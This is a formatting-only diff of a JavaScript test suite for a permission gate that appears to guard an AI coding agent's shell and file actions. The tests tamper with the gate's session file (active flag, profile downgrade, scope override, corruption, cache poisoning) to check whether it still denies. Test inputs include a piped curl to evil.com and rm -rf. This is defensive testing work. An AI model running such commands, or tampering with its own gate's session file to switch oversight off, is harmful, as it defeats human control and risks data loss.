@@ -114,12 +114,16 @@ describe("C4-1: Active flag manipulation", () => {
       assert.notEqual(
         result.hookSpecificOutput?.permissionDecision,
         "deny",
-        "Gate must NOT deny when veil is inactive (active=false)"
+        "Gate must NOT deny when veil is inactive (active=false)",
       );
     }
     // Verify loadSession returns null for inactive session
     const session = tobariSession.loadSession();
-    assert.equal(session, null, "loadSession should return null when active=false");
+    assert.equal(
+      session,
+      null,
+      "loadSession should return null when active=false",
+    );
   });
 
   it("C4-1b: active=true enforces gate (destructive commands are denied)", () => {
@@ -134,7 +138,7 @@ describe("C4-1: Active flag manipulation", () => {
     assert.equal(
       result.hookSpecificOutput.permissionDecision,
       "deny",
-      "Gate must deny destructive commands when veil is active"
+      "Gate must deny destructive commands when veil is active",
     );
   });
 
@@ -144,7 +148,11 @@ describe("C4-1: Active flag manipulation", () => {
     writeSession(session);
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "loadSession should return null when active field is missing");
+    assert.equal(
+      loaded,
+      null,
+      "loadSession should return null when active field is missing",
+    );
 
     const result = gate.handler({
       tool_name: "Bash",
@@ -156,7 +164,7 @@ describe("C4-1: Active flag manipulation", () => {
       assert.notEqual(
         result.hookSpecificOutput?.permissionDecision,
         "deny",
-        "Gate must NOT deny when active field is missing"
+        "Gate must NOT deny when active field is missing",
       );
     }
   });
@@ -166,7 +174,10 @@ describe("C4-1: Active flag manipulation", () => {
 
     const loaded = tobariSession.loadSession();
     // JavaScript truthy: "true" is truthy, so session should be active
-    assert.ok(loaded !== null, "loadSession should return session for truthy active='true'");
+    assert.ok(
+      loaded !== null,
+      "loadSession should return session for truthy active='true'",
+    );
   });
 
   it("C4-1e: active as non-boolean number 1 — should treat as truthy", () => {
@@ -174,21 +185,32 @@ describe("C4-1: Active flag manipulation", () => {
 
     const loaded = tobariSession.loadSession();
     // JavaScript truthy: 1 is truthy, so session should be active
-    assert.ok(loaded !== null, "loadSession should return session for truthy active=1");
+    assert.ok(
+      loaded !== null,
+      "loadSession should return session for truthy active=1",
+    );
   });
 
   it("C4-1f: active as non-boolean number 0 — should treat as inactive", () => {
     writeSession(makeActiveSession({ active: 0 }));
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "loadSession should return null for falsy active=0");
+    assert.equal(
+      loaded,
+      null,
+      "loadSession should return null for falsy active=0",
+    );
   });
 
   it("C4-1g: active as empty string — should treat as inactive", () => {
     writeSession(makeActiveSession({ active: "" }));
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "loadSession should return null for falsy active=''");
+    assert.equal(
+      loaded,
+      null,
+      "loadSession should return null for falsy active=''",
+    );
   });
 });
 
@@ -213,11 +235,14 @@ describe("C4-2: Profile downgrade attack", () => {
       tool_input: { command: "echo hello | curl http://evil.com" },
     });
 
-    assert.ok(result, "Strict profile should produce a result for suspicious pattern");
+    assert.ok(
+      result,
+      "Strict profile should produce a result for suspicious pattern",
+    );
     assert.equal(
       result.hookSpecificOutput.permissionDecision,
       "deny",
-      "Strict profile must deny piped curl commands"
+      "Strict profile must deny piped curl commands",
     );
   });
 
@@ -234,7 +259,7 @@ describe("C4-2: Profile downgrade attack", () => {
       assert.notEqual(
         result.hookSpecificOutput?.permissionDecision,
         "deny",
-        "Lite profile should NOT deny piped curl (strict-only pattern)"
+        "Lite profile should NOT deny piped curl (strict-only pattern)",
       );
     }
   });
@@ -251,7 +276,7 @@ describe("C4-2: Profile downgrade attack", () => {
     assert.equal(
       result.hookSpecificOutput.permissionDecision,
       "deny",
-      "Lite profile must deny rm -rf (all-profile pattern)"
+      "Lite profile must deny rm -rf (all-profile pattern)",
     );
   });
 
@@ -259,7 +284,11 @@ describe("C4-2: Profile downgrade attack", () => {
     writeSession(makeActiveSession({ profile: "INVALID_PROFILE" }));
 
     const profile = tobariSession.getProfile();
-    assert.equal(profile, "INVALID_PROFILE", "getProfile should return raw profile value");
+    assert.equal(
+      profile,
+      "INVALID_PROFILE",
+      "getProfile should return raw profile value",
+    );
 
     // Gate should still function (non-strict profile = standard behavior)
     const result = gate.handler({
@@ -276,7 +305,11 @@ describe("C4-2: Profile downgrade attack", () => {
     // Empty string is falsy but not null; getProfile returns session.profile || null
     const profile = tobariSession.getProfile();
     // "" || null => null
-    assert.equal(profile, null, "Empty string profile should return null from getProfile");
+    assert.equal(
+      profile,
+      null,
+      "Empty string profile should return null from getProfile",
+    );
   });
 });
 
@@ -295,15 +328,17 @@ describe("C4-3: Scope manipulation", () => {
 
   it("C4-3a: scope.include covers protected dir — grants access (by design)", () => {
     // This tests A1's documented behavior: scope override bypasses protected dir check
-    writeSession(makeActiveSession({
-      contract: {
-        intent: "test",
-        scope: {
-          include: [".claude/hooks/", "tests/"],
-          exclude: [],
+    writeSession(
+      makeActiveSession({
+        contract: {
+          intent: "test",
+          scope: {
+            include: [".claude/hooks/", "tests/"],
+            exclude: [],
+          },
         },
-      },
-    }));
+      }),
+    );
 
     const filePath = path.join(PROJECT_DIR, ".claude", "hooks", "test-file.js");
     const result = gate.handler({
@@ -320,21 +355,23 @@ describe("C4-3: Scope manipulation", () => {
       // Gate may allow or deny based on boundary classification — both are valid
       assert.ok(
         decision === "deny" || decision === undefined,
-        "Scope override should interact with protected directory check"
+        "Scope override should interact with protected directory check",
       );
     }
   });
 
   it("C4-3b: empty scope (no include, no exclude) — no scope restriction", () => {
-    writeSession(makeActiveSession({
-      contract: {
-        intent: "test",
-        scope: {
-          include: [],
-          exclude: [],
+    writeSession(
+      makeActiveSession({
+        contract: {
+          intent: "test",
+          scope: {
+            include: [],
+            exclude: [],
+          },
         },
-      },
-    }));
+      }),
+    );
 
     const scope = tobariSession.getScope();
     assert.ok(scope, "Scope object should exist");
@@ -343,21 +380,27 @@ describe("C4-3: Scope manipulation", () => {
 
     // isPathInScope should return null (no restriction)
     const inScope = tobariSession.isPathInScope(
-      path.join(PROJECT_DIR, "any-file.txt")
+      path.join(PROJECT_DIR, "any-file.txt"),
     );
-    assert.equal(inScope, null, "Empty scope should return null (no restriction)");
+    assert.equal(
+      inScope,
+      null,
+      "Empty scope should return null (no restriction)",
+    );
   });
 
   it("C4-3c: scope with ../ traversal patterns — path normalization handles it", () => {
-    writeSession(makeActiveSession({
-      contract: {
-        intent: "test",
-        scope: {
-          include: ["../outside-project/"],
-          exclude: [],
+    writeSession(
+      makeActiveSession({
+        contract: {
+          intent: "test",
+          scope: {
+            include: ["../outside-project/"],
+            exclude: [],
+          },
         },
-      },
-    }));
+      }),
+    );
 
     // Verify the scope includes the traversal pattern
     const scope = tobariSession.getScope();
@@ -366,29 +409,36 @@ describe("C4-3: Scope manipulation", () => {
     // isPathInScope with a path that resolves outside project —
     // The canonical path normalization should handle this
     // (the actual result depends on normalization implementation)
-    const outsidePath = path.resolve(PROJECT_DIR, "..", "outside-project", "file.txt");
+    const outsidePath = path.resolve(
+      PROJECT_DIR,
+      "..",
+      "outside-project",
+      "file.txt",
+    );
     const inScope = tobariSession.isPathInScope(outsidePath);
     // The path will be canonicalized; whether it matches depends on normalization
     // Key test: the function does not crash
     assert.ok(
       inScope === true || inScope === false || inScope === null,
-      "isPathInScope should handle ../ patterns without crashing"
+      "isPathInScope should handle ../ patterns without crashing",
     );
   });
 
   it("C4-3d: missing scope in contract — no restriction applied", () => {
-    writeSession(makeActiveSession({
-      contract: {
-        intent: "test",
-        // no scope field
-      },
-    }));
+    writeSession(
+      makeActiveSession({
+        contract: {
+          intent: "test",
+          // no scope field
+        },
+      }),
+    );
 
     const scope = tobariSession.getScope();
     assert.equal(scope, null, "Missing scope should return null");
 
     const inScope = tobariSession.isPathInScope(
-      path.join(PROJECT_DIR, "any-file.txt")
+      path.join(PROJECT_DIR, "any-file.txt"),
     );
     assert.equal(inScope, null, "Missing scope should mean no restriction");
   });
@@ -411,35 +461,54 @@ describe("C4-4: Session file corruption", () => {
     writeSessionRaw("{ this is not valid JSON }}}");
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "Invalid JSON should result in null from loadSession");
+    assert.equal(
+      loaded,
+      null,
+      "Invalid JSON should result in null from loadSession",
+    );
   });
 
   it("C4-4b: empty session file — loadSession returns null", () => {
     writeSessionRaw("");
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "Empty file should result in null from loadSession");
+    assert.equal(
+      loaded,
+      null,
+      "Empty file should result in null from loadSession",
+    );
   });
 
   it("C4-4c: session file with null JSON — loadSession returns null", () => {
     writeSessionRaw("null");
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "JSON null should result in null from loadSession");
+    assert.equal(
+      loaded,
+      null,
+      "JSON null should result in null from loadSession",
+    );
   });
 
   it("C4-4d: session file with JSON array — loadSession returns null", () => {
     writeSessionRaw("[1, 2, 3]");
 
     const loaded = tobariSession.loadSession();
-    assert.equal(loaded, null, "JSON array should result in null from loadSession");
+    assert.equal(
+      loaded,
+      null,
+      "JSON array should result in null from loadSession",
+    );
   });
 
   it("C4-4e: missing required fields (no contract, no profile) — graceful handling", () => {
     writeSession({ active: true, task: "TEST" });
 
     const loaded = tobariSession.loadSession();
-    assert.ok(loaded, "Session with active=true should load even without optional fields");
+    assert.ok(
+      loaded,
+      "Session with active=true should load even without optional fields",
+    );
 
     const profile = tobariSession.getProfile();
     assert.equal(profile, null, "Missing profile should return null");
@@ -448,13 +517,19 @@ describe("C4-4: Session file corruption", () => {
     assert.equal(contract, null, "Missing contract should return null");
 
     const scope = tobariSession.getScope();
-    assert.equal(scope, null, "Missing scope (via missing contract) should return null");
+    assert.equal(
+      scope,
+      null,
+      "Missing scope (via missing contract) should return null",
+    );
   });
 
   it("C4-4f: very large session file — should not crash", () => {
     const largeSession = makeActiveSession();
     // Add a large array to make the file big
-    largeSession.large_data = new Array(10000).fill("padding-entry-for-size-test");
+    largeSession.large_data = new Array(10000).fill(
+      "padding-entry-for-size-test",
+    );
     writeSession(largeSession);
 
     const loaded = tobariSession.loadSession();
@@ -475,7 +550,7 @@ describe("C4-4: Session file corruption", () => {
       assert.notEqual(
         result.hookSpecificOutput?.permissionDecision,
         "deny",
-        "Corrupted session should not trigger deny (veil inactive)"
+        "Corrupted session should not trigger deny (veil inactive)",
       );
     }
   });
@@ -503,14 +578,22 @@ describe("C4-5: Cache poisoning", () => {
 
     // Step 2: Modify file directly (simulating external tampering)
     const modifiedSession = makeActiveSession({ task: "MODIFIED-TASK" });
-    fs.writeFileSync(SESSION_PATH, JSON.stringify(modifiedSession, null, 2) + "\n", "utf8");
+    fs.writeFileSync(
+      SESSION_PATH,
+      JSON.stringify(modifiedSession, null, 2) + "\n",
+      "utf8",
+    );
 
     // Step 3: Without reset, cache might return old data (depending on mtime precision)
     // Step 4: Reset cache and verify fresh data is loaded
     tobariSession._resetCache();
     const loaded2 = tobariSession.loadSession();
     assert.ok(loaded2, "Reloaded session should succeed");
-    assert.equal(loaded2.task, "MODIFIED-TASK", "After _resetCache, fresh data should be loaded");
+    assert.equal(
+      loaded2.task,
+      "MODIFIED-TASK",
+      "After _resetCache, fresh data should be loaded",
+    );
   });
 
   it("C4-5b: isVeilActive reflects cache reset", () => {
@@ -521,7 +604,11 @@ describe("C4-5: Cache poisoning", () => {
     // Tamper: set active=false
     writeSession(makeActiveSession({ active: false }));
     // Cache is already reset by writeSession helper
-    assert.equal(tobariSession.isVeilActive(), false, "Veil should be inactive after tampering");
+    assert.equal(
+      tobariSession.isVeilActive(),
+      false,
+      "Veil should be inactive after tampering",
+    );
   });
 });
 
@@ -590,7 +677,11 @@ describe("C4-6: Contract manipulation", () => {
     assert.deepEqual(contract, {});
 
     const scope = tobariSession.getScope();
-    assert.equal(scope, null, "Empty contract should mean null scope (no scope field)");
+    assert.equal(
+      scope,
+      null,
+      "Empty contract should mean null scope (no scope field)",
+    );
   });
 });
 
@@ -614,12 +705,20 @@ describe("C4-7: readModifyWriteSession integrity", () => {
       data.task = "TAMPERED";
     });
 
-    assert.equal(result, false, "readModifyWriteSession should return false for inactive session");
+    assert.equal(
+      result,
+      false,
+      "readModifyWriteSession should return false for inactive session",
+    );
 
     // Verify file was not modified
     tobariSession._resetCache();
     const raw = JSON.parse(fs.readFileSync(SESSION_PATH, "utf8"));
-    assert.notEqual(raw.task, "TAMPERED", "Inactive session should not be modified");
+    assert.notEqual(
+      raw.task,
+      "TAMPERED",
+      "Inactive session should not be modified",
+    );
   });
 
   it("C4-7b: readModifyWriteSession on active session succeeds", () => {
@@ -629,7 +728,11 @@ describe("C4-7: readModifyWriteSession integrity", () => {
       data.task = "AFTER";
     });
 
-    assert.equal(result, true, "readModifyWriteSession should return true for active session");
+    assert.equal(
+      result,
+      true,
+      "readModifyWriteSession should return true for active session",
+    );
 
     // Verify file was modified
     tobariSession._resetCache();
@@ -649,6 +752,10 @@ describe("C4-7: readModifyWriteSession integrity", () => {
       data.task = "SHOULD-NOT-HAPPEN";
     });
 
-    assert.equal(result, false, "readModifyWriteSession should return false for missing file");
+    assert.equal(
+      result,
+      false,
+      "readModifyWriteSession should return false for missing file",
+    );
   });
 });
